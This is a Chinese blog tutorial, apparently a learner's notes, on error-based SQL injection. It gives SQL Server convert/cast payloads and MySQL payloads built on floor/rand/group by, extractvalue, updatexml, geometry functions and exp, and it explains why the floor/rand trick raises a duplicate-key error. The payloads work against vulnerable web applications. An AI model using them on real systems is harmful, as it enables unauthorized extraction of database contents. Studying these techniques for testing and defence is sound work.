@@ -1,0 +1,602 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="LaLa" />
+
+
+
+<meta name="description" content="— 从零开始的笔记 —— Mysql报错注入 —">
+<meta name="keywords" content="web">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB-SQL报错注入">
+<meta property="og:url" content="http://lalajun.com/2018/04/09/WEB-SQL报错注入/index.html">
+<meta property="og:site_name" content="啦啦菌NODE">
+<meta property="og:description" content="— 从零开始的笔记 —— Mysql报错注入 —">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0ixscjj30bl05eaa5.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0c65quj30aq05e0st.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n0udra5j304207hweb.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0n86ptj30jl066dg0.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n0z7mc4j303n02r742.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n12xkq1j30bb063wef.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n17acqfj30d90a23yz.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1cw8wbj309105ejri.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n1g1ozyj309w05emx8.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1k3s6oj30db06cjrj.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n1tfbq1j30db06cglr.jpg">
+<meta property="og:image" content="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1xktazj30dc05vglq.jpg">
+<meta property="og:updated_time" content="2018-04-09T11:46:47.054Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="WEB-SQL报错注入">
+<meta name="twitter:description" content="— 从零开始的笔记 —— Mysql报错注入 —">
+<meta name="twitter:image" content="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0ixscjj30bl05eaa5.jpg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="啦啦菌NODE" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>WEB-SQL报错注入 | 啦啦菌NODE</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">LaLa</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>Menu</li>
+                        <li>Tags</li>
+                        
+                        <li>Friends</li>
+                        
+                        
+                        <li>About Me</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="/827177488@qq.com" title="Email"></a>
+                            
+                                <a class="fa bilibili" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
+                            
+                                <a class="fa QQ" href="/827177488" title="QQ"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/比特币/">比特币</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://betamaois.github.io">betamao</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://err0rzz.github.io">壮壮</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://esebanana.github.io">ESE</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hhddj.github.io/">hhd</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://blog.0kami.cn/">0kami</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://b3t4m3ee.github.io/">b3t4m3ee</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://www.leavesongs.com/">leavesong</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://iamstudy.cnblogs.com/">l3m0n</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://myblackmanba.github.io/">MyBlackManba</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">biubiubiubiu～&lt;br&gt;动感光波！&lt;br&gt;&lt;br&gt;晚安～</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">LaLa</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">LaLa</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="/827177488@qq.com" title="Email"></a>
+                            
+                                <a class="fa bilibili" target="_blank" href="https://space.bilibili.com/1664263/#!/" title="bilibili"></a>
+                            
+                                <a class="fa QQ" target="_blank" href="/827177488" title="QQ"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="Tags" friends="Friends" about="About Me"/>
+</nav>
+      <div class="body-wrap"><article id="post-WEB-SQL报错注入" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2018/04/09/WEB-SQL报错注入/" class="article-date">
+      <time datetime="2018-04-09T06:07:12.000Z" itemprop="datePublished">2018-04-09</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      WEB-SQL报错注入
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/">web</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p>— 从零开始的笔记 —<br>— Mysql报错注入 —<br><a id="more"></a></p>
+<p>一直堆着没有写…那么现在开始整理这种在特殊情境下节省时间的注入方法吧</p>
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p><strong>报错注入</strong>：通过报错信息来获取我们想要的信息的SQL注入利用方式。<br>其构造根据产生报错的函数而各有不同，但是目的就是执行我们输入的sql语句，并通过报错回显的方式直接输出结果。<br><strong>前提</strong>：</p>
+<ul>
+<li>存在sql注入点</li>
+<li>需要页面有错误回显</li>
+<li>利用函数没有被过滤</li>
+</ul>
+<p>先提一些SQL Server</p>
+<h2 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h2><p>SQL Server 中的报错函数，以数据类型转换错误最为常见。CAST()函数和CONVERT()函数都不能执行四舍五入或截断操作，如果执行就会产生错误信息。</p>
+<ul>
+<li><strong>convert()</strong>：CONVERT() 函数可以用不同的格式显示日期/时间数据。<br><code>CONVERT(目标数据类型,内容,日期/时间输出格式)</code></li>
+<li><strong>cast()</strong>：CAST()函数可以用来转换数据类型<br><code>CAST (表达式 AS 目标数据类型)</code>  </li>
+</ul>
+<p>利用如下（强行换行为了看清楚）：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> </div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="keyword">convert</span>(<span class="built_in">int</span>,(<span class="keyword">select</span> top <span class="number">1</span> users.username <span class="keyword">from</span> <span class="keyword">users</span>))</div><div class="line"></div><div class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username=<span class="string">'root'</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">'root'</span> </div><div class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="keyword">cast</span>((<span class="keyword">select</span> top <span class="number">1</span> users.username <span class="keyword">from</span> <span class="keyword">users</span>)，<span class="built_in">int</span>)</div></pre></td></tr></table></figure></p>
+<h1 id="Mysql"><a href="#Mysql" class="headerlink" title="Mysql"></a>Mysql</h1><p>Mysql报错函数很多，下面一种种进行说明以及演示</p>
+<h2 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h2><p>说是floor()报错，但实际上这个报错floor()只是其中的一小环，需要联合rand()，group by 一起使用。</p>
+<ul>
+<li><strong>floor()</strong>:floor(num)函数只返回num整数部分，小数部分舍弃。</li>
+<li><strong>rand()</strong>:rand()可以产生一个随机的0-1的数字;rand()括号中给予参数，就可以相当于给了一个伪随机数的种子，伪随机数种子不变，那么接下来产生的随机数是固定的。</li>
+<li><strong>group by</strong>：group by 列名/列号，实现产生列名相同的合并成一行的临时表，然后从临时表中查询，如果从一个合并后有多个值的字段中查询，只会显示第一个。但可以对所有使用聚合函数，详情戳<a href="https://blog.csdn.net/hao1066821456/article/details/69556644" target="_blank" rel="external">=w=</a></li>
+</ul>
+<h3 id="报错利用"><a href="#报错利用" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> </div><div class="line">(</div><div class="line">    <span class="keyword">select</span></div><div class="line">          <span class="keyword">count</span>(*),      # 必不可少 别忘了<span class="string">','</span></div><div class="line">          <span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)) x  # <span class="keyword">user</span>()可以替换为需要查询的<span class="keyword">select</span>语句，要求返回一行；构成临时表x</div><div class="line">    <span class="keyword">from</span></div><div class="line">          information_schema.TABLES   #随意指定一张存在的表，权限可以<span class="keyword">SELECT</span>，行数必须&gt;=<span class="number">3</span>，之后说明</div><div class="line">    <span class="keyword">group</span> <span class="keyword">by</span></div><div class="line">          x       # 调用临时表x</div><div class="line">) a; #构成临时表</div></pre></td></tr></table></figure>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0ixscjj30bl05eaa5.jpg" alt="2.png"><br>也可以换一个姿势<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> </div><div class="line">(</div><div class="line">    <span class="keyword">select</span></div><div class="line">          <span class="keyword">count</span>(*)</div><div class="line">    <span class="keyword">from</span></div><div class="line">          information_schema.TABLES</div><div class="line">    <span class="keyword">group</span> <span class="keyword">by</span></div><div class="line">          <span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> lesson1 <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))      </div><div class="line">) <span class="keyword">as</span> a;</div></pre></td></tr></table></figure></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0c65quj30aq05e0st.jpg" alt="1.png"></p>
+<blockquote>
+<p>ps.报错结果中最后的1 是由floor(rand(0)*2)产生的</p>
+</blockquote>
+<h3 id="复杂的原理"><a href="#复杂的原理" class="headerlink" title="复杂的原理"></a>复杂的原理</h3><p>关于 group by 与 rand() 在一起会产生蜜汁化学反应,对此官网有提到：</p>
+<blockquote>
+<p>Use of a column with RAND() values in an ORDER BY or GROUP BY clause may yield unexpected results because for either clause a RAND() expression can be evaluated multiple times for the same row, each time returning a different result.<br>按照ORDER BY或GROUP BY子句的顺序使用RAND（）值的列可能会产生意想不到的结果，因为对于任一子句，RAND（）表达式都可以被多次评估，每次返回一个不同的结果。</p>
+<p>对于这种蜜汁化学反应，网上大部分对报错注入的说明都是rand()产生的值被当做主键放入临时表中，至于它为什么不是被当做列号处理，和其他参数有啥区别…以及究竟具体情况是如何的，网上没有找到更详细的说明，虽然有关于group的底层实现，请原谅老朽才学疏浅，无法看懂。</p>
+</blockquote>
+<p>所以可以先建立一个可以解释原理的观念：rand() 放在group by 后时，<strong>rand产生的值被当做主键放入临时表中</strong></p>
+<p>接下来解释文档中提到的<strong>多次评估</strong>，同时说明当select count(*) group by rand()在一起时操作的流程：</p>
+<ul>
+<li>1.group by 会产生一张临时表</li>
+<li>2.查询原表的一行,按照group by的rand()判断，此时计算一次rand()</li>
+<li>3.判断 rand()计算结果 作为的主键是否已经存在在临时表中</li>
+<li>4.若已经存在，count(*)结果+1。返回步骤2</li>
+<li>5.若不存在，向临时表中插入这行数据，此时计算一次rand()</li>
+<li>6.按照 rand()计算结果 作为的主键写入临时表。返回步骤2</li>
+</ul>
+<p>这么一看可能有点复杂，但是可以分析得出：如果判断主键存在，rand()只需要计算<strong>一次</strong>，如果判断主键不存在，rand()总共要计算两次。<br>此时的流程为：<code>---rand计算---判断---rand计算---插入---</code></p>
+<p>同时，我们知道rand()的值是会变化的，如果rand计算一次，判断主键是不存在了，rand第二次计算时的结果作为插入的主键又已经存在于临时表中，会发生什么？自然就是我们之前看到的报错了。</p>
+<p><strong>floor(rand(0)*2)</strong>正是特意构造的这么一串”随机数”</p>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n0udra5j304207hweb.jpg" alt="4.png"></p>
+<p>下面将 <strong>floor(rand(0)*2)</strong> 替代 <strong>rand()</strong>，按照”随机数”的值看下执行流程</p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n0n86ptj30jl066dg0.jpg" alt="3.png"></p>
+<p>最后报错成功，这里我们也可以解决之前的疑问，为什么必须有三行数据才行，因为三行数据才能触发错误。</p>
+<p>由于是主键重复，一行错误触发是不可能的，有没有可能两行来触发呢？<br>根据原理只要找到随机种子生成的随机数是<strong>1101,0010,0101,1010</strong>都可以</p>
+<p>随便凑了一下，发现 -7 可以</p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n0z7mc4j303n02r742.jpg" alt="5.png"></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n12xkq1j30bb063wef.jpg" alt="6.png"></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n17acqfj30d90a23yz.jpg" alt="7.png"></p>
+<p>success! </p>
+<p>还有不懂<a href="https://mp.weixin.qq.com/s?__biz=MzA5NDY0OTQ0Mw==&amp;mid=403404979&amp;idx=1&amp;sn=27d10b6da357d72304086311cefd573e&amp;scene=1&amp;srcid=04131X3lQlrDMYOCntCqWf6n#wechat_redirect" target="_blank" rel="external">戳这里</a></p>
+<p>floor在Mysql 5.0 可以使用<br>以下的函数在MySQL 5.1.5以后可以使用：</p>
+<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><p><strong>extractvalue()</strong>:用来解析XML数据，从目标XML中返回包含所查询值的字符串<br><code>EXTRACTVALUE (XML_document, XPath_string);</code><br>XML_document：String格式，为XML文档对象的名称或文档内容<br>XPath_string：Xpath格式的字符串<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SELECT</span> ExtractValue(<span class="string">'&lt;a&gt;&lt;b/&gt;&lt;/a&gt;'</span>, <span class="string">'count(/a/b)'</span>);</div><div class="line"><span class="keyword">SELECT</span> extractvalue(doc,<span class="string">'/book/author/initial'</span>);</div></pre></td></tr></table></figure></p>
+<h3 id="报错利用-1"><a href="#报错利用-1" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x2e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="string">'.'</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()))))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x2e</span>,(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>))))</div></pre></td></tr></table></figure>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1cw8wbj309105ejri.jpg" alt="8.png"></p>
+<p>注意<code>limit 1</code></p>
+<p>通过报错信息显而易见，语法错误<br>使用concat()是因为，可以在前面加入字符导致xpath格式非法<br>此处有点奇怪，当使用<strong>0x5c(/)</strong>读取user()时，第一个字符会不见；<br>当使用数字1，读取数字不会报错<br>换成<strong>0x2e(.)</strong>都可以成功，就都用0x2e吧，到时候在更根据情况修改</p>
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><p><strong>updatexml()</strong>:更新XML，改变文档中符合条件的节点的值<br><code>UPDATEXML (XML_document, XPath_string, new_value);</code><br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">update</span> x <span class="keyword">set</span> doc=updatexml(doc,<span class="string">'/book/author/initial'</span>,<span class="string">'!!!'</span>);</div></pre></td></tr></table></figure></p>
+<h3 id="报错利用-2"><a href="#报错利用-2" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5e24</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x5e24</span>),<span class="number">1</span>))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x5e24</span>,(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>),<span class="number">0x5e24</span>),<span class="number">1</span>))</div></pre></td></tr></table></figure>
+<p>注意<code>limit 1</code></p>
+<p><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fq6n1g1ozyj309w05emx8.jpg" alt="9.png"></p>
+<p>原理相同</p>
+<h2 id="GeometryCollection"><a href="#GeometryCollection" class="headerlink" title="GeometryCollection()"></a>GeometryCollection()</h2><p>GeometryCollection()：可以建立一个保存任意类型的空间数据<br>不深入</p>
+<h3 id="报错利用-3"><a href="#报错利用-3" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> GeometryCollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">type</span> <span class="keyword">from</span> lesson2 <span class="keyword">limit</span> <span class="number">1</span>)a)b))</div></pre></td></tr></table></figure>
+<p>注意<code>limit 1</code></p>
+<p><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fq6n1k3s6oj30db06cjrj.jpg" alt="10.jpg"></p>
+<h2 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h2><p><strong>polygon()</strong>:与上类似建立一个空间多边形数据<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">SET</span> @poly =</div><div class="line">       <span class="string">'Polygon((0 0,0 3,3 0,0 0),(1 1,1 2,2 1,1 1))'</span>;</div></pre></td></tr></table></figure></p>
+<h3 id="报错利用-4"><a href="#报错利用-4" class="headerlink" title="报错利用"></a>报错利用</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">#读取其他与上相同</div></pre></td></tr></table></figure>
+<p><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fq6n1tfbq1j30db06cglr.jpg" alt="11.png"></p>
+<h2 id="multipoint-multilinestring-multipolygon-linestring"><a href="#multipoint-multilinestring-multipolygon-linestring" class="headerlink" title="multipoint() multilinestring() multipolygon() linestring()"></a>multipoint() multilinestring() multipolygon() linestring()</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">multipoint():点元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">multilinestring():线元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">multipolygon():多边形集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div><div class="line">linestring():线串</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b))</div></pre></td></tr></table></figure>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h2><p><strong>exp()</strong>:返回e(自然对数的底)到X次方的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">multipoint():点元素集合</div><div class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> lesson1 <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span>*<span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a))</div></pre></td></tr></table></figure></p>
